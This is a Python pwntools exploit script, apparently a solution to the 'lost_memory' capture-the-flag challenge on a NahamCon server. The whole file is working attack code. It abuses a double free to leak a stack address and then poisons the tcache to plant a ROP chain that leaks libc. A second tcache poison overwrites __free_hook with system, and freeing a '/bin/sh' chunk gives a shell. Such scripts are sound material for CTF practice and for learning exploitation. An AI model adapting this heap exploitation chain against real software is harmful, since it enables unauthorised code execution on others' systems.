#!/usr/bin/env python3

from pwn import *

elf = ELF("./lost_memory")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
continue
'''
def start():
    if args.REMOTE:
        return remote("challenge.nahamcon.com", 30427)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

rcu(b"choice:\n")

def alloc(size):
    sl(b"1")
    sla(b"What size would you like?", bc(size))
    rcu(b"choice:\n")

def write_data(data):
    sl(b"2")
    sla(b"What would you like to write?", data)
    rcu(b"choice:\n")

def select_index(index):
    sl(b"3")
    sla(b"(0 - 9)", bc(index))
    rcu(b"choice:\n")

def free():
    sl(b"4")
    rcu(b"choice:\n")

def store_flag_ptr():
    sl(b"5")
    #rcu(b"choice:\n")

def exit_program():
    sl(b"6")  # menu option
#========= exploit here ===================
#rcu(b"choice:\n")

r.timeout = 1
#leak stack
alloc(0x88) #guard
free()
write_data(b"A")
free()
store_flag_ptr()
leak = int(rcu(b"eturn value: ", "\n"),16)
leak2 = int(rcu(b"eturn value: ", "\n"),16)
rcu(b"choice:\n")
logleak("stack leak", leak)
logleak("stack leak2", leak)

# ROP to leak
write_data(p64(leak+0x20)+p64(0)) #ret address
alloc(0x88)
alloc(0x88)

rop = ROP(elf)

payload = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.printf)
payload += p64(elf.sym.puts)
payload += p64(elf.sym.main)
write_data(payload)
#trigger ret
exit_program()
r.recvline()
# get libc leak
leak = u64(r.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym.printf
libcbase()
#tcache poison to get RCE by overwriting the free hook
alloc(0x98)
free()
write_data(b"A")
free()
write_data(p64(libc.sym.__free_hook)+p64(0)) #ret address
alloc(0x98)
alloc(0x98)
write_data(p64(libc.sym.system))
alloc(0x18)
write_data(b"/bin/sh\0")
sleep(0.2)
# call free_hook
sl(b"4")
#========= interactive ====================
r.interactive()
